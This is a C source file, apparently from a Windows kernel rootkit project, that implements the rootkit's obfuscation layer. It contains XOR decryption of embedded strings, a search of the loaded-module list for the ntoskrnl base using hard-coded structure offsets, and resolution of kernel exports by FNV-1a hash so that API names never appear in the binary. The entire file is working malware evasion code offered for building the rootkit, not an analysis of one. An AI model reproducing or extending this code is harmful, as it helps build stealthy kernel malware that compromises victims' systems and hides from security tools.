/*==============================================================================
 * rootkit/src/obfuscate.c
 *------------------------------------------------------------------------------
 * String XOR decryption + API hashing / runtime export resolution.
 *============================================================================*/
#include "../utils.h"
#include <ntimage.h>

/*==============================================================================
 * XOR DECRYPTION
 *------------------------------------------------------------------------------
 * Decrypts a buffer encrypted with the compile-time XOR_KEY (config.h).
 * Writes null-terminated result to caller-supplied buffer.
 *============================================================================*/
BOOLEAN rk_xor_decrypt(const UCHAR* enc, SIZE_T enc_len, UCHAR* out, SIZE_T out_cap) {
    if (enc_len + 1 > out_cap) return FALSE;
    for (SIZE_T i = 0; i < enc_len; i++) {
        out[i] = (UCHAR)(enc[i] ^ (UCHAR)XOR_KEY);
    }
    out[enc_len] = 0;
    return TRUE;
}

/*==============================================================================
 * NTOSKRNL BASE RESOLUTION
 *------------------------------------------------------------------------------
 * Walks PsLoadedModuleList to find the KLDR_DATA_TABLE_ENTRY for ntoskrnl.exe
 * by comparing BaseDllName (case-insensitive). Returns the DllBase address.
 *
 * KLDR_DATA_TABLE_ENTRY layout (offsets from list entry):
 *   +0x000 InLoadOrderLinks (LIST_ENTRY)
 *   +0x030 DllBase
 *   +0x048 BaseDllName (UNICODE_STRING)
 *   +0x058 FullDllName
 *============================================================================*/
static PVOID find_nt_base(VOID) {
    PLIST_ENTRY head = PsLoadedModuleList;
    if (!head) return NULL;

    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        PUCHAR entry = (PUCHAR)e;
        PVOID  base  = *(PVOID*)(entry + 0x30);
        PUNICODE_STRING name = (PUNICODE_STRING)(entry + 0x48);

        if (name->Buffer && name->Length >= 24) {
            /* Case-insensitive compare against "ntoskrnl.exe" (12 chars) */
            static const char nt_lc[] = "ntoskrnl.exe";
            BOOLEAN match = TRUE;
            for (ULONG i = 0; i < 12; i++) {
                WCHAR wc = name->Buffer[i];
                char c = (char)wc;
                if (c >= 'A' && c <= 'Z') c += 0x20;
                if (c != nt_lc[i]) { match = FALSE; break; }
            }
            if (match) return base;
        }
    }
    return NULL;
}

/*==============================================================================
 * EXPORT RESOLUTION BY HASH
 *------------------------------------------------------------------------------
 * Parses the ntoskrnl export directory and matches against the provided
 * FNV-1a hash. Returns the function address or NULL if not found.
 *============================================================================*/
PVOID rk_resolve_nt(ULONG64 hash) {
    PVOID base = find_nt_base();
    if (!base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_DATA_DIRECTORY exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)base + exp_dir->VirtualAddress);

    PDWORD names    = (PDWORD)((PUCHAR)base + exp->AddressOfNames);
    PWORD  ordinals = (PWORD) ((PUCHAR)base + exp->AddressOfNameOrdinals);
    PDWORD funcs    = (PDWORD)((PUCHAR)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((PUCHAR)base + names[i]);
        if (rk_fnv1a(name) == hash) {
            return (PUCHAR)base + funcs[ordinals[i]];
        }
    }
    return NULL;
}